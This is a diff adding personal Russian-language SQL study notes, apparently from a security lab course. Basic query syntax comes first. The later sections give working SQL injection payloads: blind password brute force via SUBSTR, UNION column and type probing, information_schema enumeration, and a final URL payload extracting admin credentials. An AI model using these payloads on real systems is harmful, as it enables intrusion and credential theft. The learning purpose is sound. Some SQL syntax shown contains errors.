@@ -1,0 +1,239 @@
+====== SQL sheet =======
+
+SELECT -
+	Позволяет выбрать строки/столбцы из бд
+	
+	SELECT * FROM table - вытащить все строки из таблицы
+	SELECT field1, ..., fieldN FROM table - вытащить определенные столбцы для всех строк из таблицы
+	SELECT DISTINCT(col) FROM table - вытащить уникальные элементы из столбца col
+	SELECT field1 AS field FROM table - вытащить столбец field1 переименованный на field для всех строк из таблицы
+	SELECT DISTINCT(col) FROM table LIMIT 10 - вытащить первые 10 уникальных элементов из столбца col
+	
+========================
+
+WHERE -
+	позволяет фильтровать строки 
+	
+	SELECT * FROM table WHERE fieldX == 'content' - вытащить все строки у которых fieldX = 'content'
+	
+	 Операторы сравнения :
+	 
+	 =, <> !=, >, >=, <, <=,
+	 between - значение на отрезке
+	 in - в списке
+	 like - по шаблону
+	 
+	SELECT * FROM table WHERE field BETWEEN 10 AND 20 - вытащить все строки где 10 <= field <= 20
+	SELECT * FROM table WHERE field IN ('A', 'B', 'C') - вытащить все строки где field входит в список
+	SELECT * FROM table WHERE field LIKE '_Hello%' - вытащить все строки где field соответствует такому шаблону
+	('_' - 1 символ на позиции / '%' - любое кол-во символов включая 0 символов)
+	
+	Так же есть логические AND, OR, NOT для WHERE
+	
+========================
+
+ORDER BY -
+	Позволяет сортировать строки по параметрам
+	
+	SELECT * FROM table ORDER BY field - вытащить все поля из table где строки отсортированы по параметру field
+	после поля можно добавить ASC - сортировка по возрастанию (дефолтная, можно не писать) и
+	DESC - по убыванию
+	
+	Можно комбинировать с фильтром WHERE 
+	
+	SELECT * FROM table WHERE field1 == 'content' ORDER BY field2 LIMIT 5 - вытащить все строки где field1 равен 'content' и отсортировать по возрастанию, показав первые 5 строк
+	
+	По нескольким параметрам :
+	
+	SELECT * FROM table ORDER BY field1, field2 - вытащить все столбцы отсортировав сначала по field1, а потом по field2
+
+==== СОЗДАНИЕ ТАБЛИЦ ====
+
+	ТИПЫ ДАННЫХ - 
+		CHARACTER(n) | CHAR(n) - строка фикс. длины
+		CHARACTER VARYING(n) | VARCHAR(n) - строка переменной длины с макс. длиной n
+		BOOLEAN - логическая истина/ложь
+		INTEGER - целое число
+		NUMERIC(p, s) - действительное ч-ло. p - кол-во значащих цифр | s - кол-во цифр после запятой
+		REAL - float
+		DOUBLE PRECISION - double
+		DATE - дата
+		TIMESTAMP - временная метка (дата + время)
+		SERIAL - автоинкрементное целочисленное поле [спецификатор PostgreSQL]
+		
+	СОЗДАНИЕ - 
+		CREATE TABLE users (
+			id SERIAL PRIMARY KEY,
+			name VARCHAR(20),
+			surname VARCHAR(20),
+			age INT,
+			vip BOOLEAN,
+			balance NUMERIC(100, 10),
+			registration TIMESPAMP
+		);
+		
+	УДАЛЕНИЕ - 
+		DROP TABLE users; 		- безусловное удаление
+		DROP TABLE IF EXIST users; 	- удалить если существует
+	
+==== ИЗМЕНЕНИЕ ТАБЛИЦ ====
+
+	ALTER TABLE users ADD COLUMN login VARCHAR(20);		- аппенд нового столбца
+	ALTER TABLE users DROP COLUMN vip;			- удалить столбец 'vip'
+	ALTER TABLE users RENAME COLUMN registration TO date;	- изменить имя столбца
+	ALTER TABLE users RENAME TO clients;			- изменить имя таблицы
+	
+==== ИЗМЕНЕНИЕ ДАННЫХ ====
+
+	Вставка :
+		INSERT INTO table(field1, ..., fieldN) VALUES (value1, ..., valueN);
+		Вставить в соответствующие поля table соответствующие значения VALUES
+		
+		Так же можно сделать PRIMARY KEY явно :
+		
+		INSERT INTO table(id, field1, ..., fieldN) VALUES (ident,  value1, ..., valueN);
+
+		И можно в целом не писать названия полей если подразумевается что будет заполнена вся строка 
+		
+		INSERT INTO table VALUES (ident,  value1, ..., valueN);
+	
+	Изменение :
+		UPDATE pwn 
+		SET field1='content1', ..., fieldN='contentN' WHERE id=1
+	
+	Удаление :
+		DELETE FROM table WHERE field='content'; - удалить все строки из таблицы у которых field равно content
+	
+==== ГРУППИРОВКА ДАННЫХ ====
+
+	SELECT field, COUNT(*) FROM table GROUP BY field; - сгруппировать строки по параметру field и вывести : field | Кол-во вхождений в виде таблицы
+	
+	SELECT field, COUNT(*) AS values FROM table GROUP BY field; - теперь в заголовке таблицы вместо count будет values
+	
+	SELECT field1, field2, COUNT(*) FROM table GROUP BY field1, field2; - многоуровневая группировка - группируем эл-ты сначала по field1, потом по field2. В итоге будет подсчитано сколько эл-ов имеют одинаковые значения в тех столбцах
+	
+	SELECT field, COUNT(*) FROM table WHERE fieldX='content' GROUP BY field; - фильтрация и группировка
+	
+	
+==== АГРЕГАТНЫЕ ФУНКЦИИ ====
+
+	SELECT field, COUNT/MAX/MIN/AVG/SUM(field2) FROM table GROUP BY field;
+	
+	Можно комбинировать а.ф, например 
+	
+	SELECT field, COUNT(field2), SUM(field3) FROM table GROUP BY field;
+	
+	Выведет сгруппированные строки по полю field, где 2 столбец - кол-во таких строк, где field2 не пуст и сумму значений в сгруппированных строках по столбцу field3
+	
+	SELECT field, MAX(field2), AVG(field3) FROM table GROUP BY field;
+	
+	2 столбец - максимальное значение из столбцов сгруппированных строк, 3 столбец - среднее значение из столбцов сгруппированных строк
+	
+	Так же для названий столбцов агрегатных функций можно использовать алиасы через AS, сортировку
+	Еще можно использовать их без группировки, тогда значения будут считаться по всей таблице
+	
+==== СОРТИРОВКА ГРУППОВЫХ ЗАПРОСОВ ====
+
+	SELECT field, SUM(field1)
+	FROM table
+	WHERE field2='content'
+	GROUP BY table
+	HAVING COUNT(*) BETWEEN 10 AND 20;
+	
+	HAVING Позволяет отсортировать групповой запрос, т.к WHERE срабатывает еще до создания группы
+	Выбираем те строки, где field2='content' и кол-во сгруппированных строк 10 <= n <= 20
+	
+	Очевидно, что для этого так же работает сортировки, лимиты, комбинирование лог. выражений и тд
+	
+==== ОПЕРАТОР ПОДСТРОКИ ==== SQL INJECTION ====
+
+	SUBSTR(field, start_pos, how_many)
+	
+	Пример :
+	
+	SELECT id FROM users WHERE login='sayhi' AND SUBSTR(password, 1, 1) = 'a' -- // AND password=' '' <- все что после -- это комментарий и не учитывается
+					 ↑ тут начинается пейлоад | тут заканчивается ↑
+	
+	Вернуть id юзера где логин sayhi и подстрока в пароле из одного символа равна 'a'
+	
+	Конкретно этот кейс демонстрирует payload для sql инъекции, позволяющая произвести брутфорс пароля по одному символу. 
+	
+	1) Формируем словарь по которому будем перебирать символ. Обычно англ алфавит (строчные, заглавные) + цифры + спецсимволы с клавиатуры
+	2) Отправляем запросы [ SELECT id FROM users WHERE login='sayhi' AND password LIKE "_" -- // AND password=' '' ] с переменным кол-вом _ чтобы узнать длину пароля (когда будет достаточно _ нас пустят)
+		(есть еще 1 способ - SELECT id FROM users WHERE login='sayhi' AND LENGTH(password) = 1, где инкрементируем единицу пока нас не пустят)
+	3) SELECT id FROM users WHERE login='sayhi' AND SUBSTR(password, 1, 1) = 'a' -- // AND password=' '' - подставляя вместо 'a' символы алфавита, пока по сигнатуре страницы не будет понятно что логин был успешный
+	4) Когда буква подобрана, меняем инкрементируем второй аргумент (или первый, тогда достаточно проверять по 1 букве) SUBSTR чтобы проверить следующую позицию. Дальше logout. Затем проделываем так пока не достигнем найденной во 2м пункте длины
+	
+	
+==== ОПРЕДЕЛЕНИЕ КОЛИЧЕСТВА ПОЛЕЙ В ОТВЕТЕ ====
+
+	Через сортировку : 
+	
+		SELECT * FROM users WHERE username='sayhi' ORDER BY 1 -- AND password=''
+		
+		ORDER BY может принимать в аргументы номер столбца по которому сортировать
+		Когда в респонсе получили ошибку, значит аргумент - 1 = кол-во столбцов в результате
+	
+	Через объединение таблиц :
+	
+		SELECT * FROM users WHERE username='sayhi' UNION SELECT NULL, ... , NULL -- AND password=''
+		
+		UNION - опрератор объединения вывода, чтобы он сработал нужно чтобы : 
+			1) Количество полей возвращаемых первым SELECT совпадало с кол-вом полей второго SELECT
+			2) Типы данных должны совпадать
+			
+		NULL - тип данных который "подходит" для работы со всеми типами данных
+		
+		Таким образом, когда такой запрос вернет что-то (не ошибку), значит кол-во NULL во втором SELECT
+		совпадает с кол-вом полей первого SELECT
+		
+		На некоторых интерпретаторах, например от Oracle, UNION SELECT ждет FROM после полей
+		В таком случае нужно ставить FROM DUAL
+		
+==== ОПРЕДЕЛЕНИЕ ТИПОВ ДАННЫХ В ОТВЕТЕ ====
+
+	После того, как определили кол-во данных в запросе, можно определить типы данных в ответе
+	
+	SELECT * FROM users WHERE username='sayhi' UNION SELECT 'a', NULL, ... -- AND password=''
+	
+	Вместо 'a' может быть 1, как число. Перебирая их вместо NULL при успешном респонсе мы поймем где что
+
+==== ОПРЕДЕЛЕНИЕ ВЕРСИИ СУБД ====
+
+	Database type 		Query
+
+	Microsoft, MySQL 	SELECT @@version
+	Oracle 			SELECT * FROM v$version
+	PostgreSQL 		SELECT version()
+
+==== ОПРЕДЕЛЕНИЕ МЕТАДАННЫХ СУБД ====
+
+	Чтобы UNION атака была осмысленной, нам необходимо знать сигнатуру столбцов и их типы данных, в этом может помочь специальный объект
+	p.s. это сработает на не-Oracle-based СУБД
+	
+	information_schema
+
+	Этот объект содержит поля : tables, columns. Обращение к ним идет через точку.
+	Если мы обратимся к БД следующим образом : 
+	
+	SELECT * FROM information_schema.tables
+	
+	То получим метаданные всех таблиц которые имеет сервис, включающих название таблиц
+	Чтобы сразу отсеить названия таблиц, которые на нужную БД не похожи, можно воспользоваться LIKE : 
+	
+	SELECT * FROM information_schema.tables WHERE table_name LIKE '%user%'
+	
+	Теперь, зная название можно узнать названия и типы данных столбцов таблиц :
+	
+	SELECT column_name, data_type FROM information_schema.columns WHERE table_name='user_db'
+	
+	Теперь мы получим названия столбцов и их типы данных, зная которые можно провести UNION атаку
+	Следует не забывать, что payload'ы выше тоже проходят через UNION и могут выглядеть примерно так :
+	
+	GET /filter?category=Lifestyle'+AND+1=2+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_dugufm'-- HTTP/2
+		             ^														       ^
+	Для него нужно действовать согласно ограничениям UNION.
+	
+	Ну и финальный payload : 
+	
+	Lifestyle'+AND+1=2+UNION+SELECT+username_mceijz,password_ovkous+FROM+users_dugufm+WHERE+username_mceijz+LIKE+'admin%'--
